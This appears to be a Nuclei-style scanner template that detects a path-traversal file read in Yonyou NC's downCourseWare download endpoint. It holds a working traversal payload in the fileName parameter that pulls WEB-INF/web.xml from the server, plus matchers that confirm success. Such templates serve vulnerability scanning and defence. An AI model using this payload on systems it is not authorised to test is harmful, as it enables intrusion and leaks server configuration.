id: poc-yaml-yongyou-nc-downcourseware-anyfile-read
info:
  name: 用友 NC downCourseWare 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
http:
  - method: GET
    path:
      - "{{BaseURL}}/portal/pt/downCourseWare/download?fileName=../webapps/nc_web/WEB-INF/web.xml&pageId=login"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "java.sun.com"
          - "<listener>"
          - "</web-app>"
      - type: word
        part: header
        words:
          - "filename="
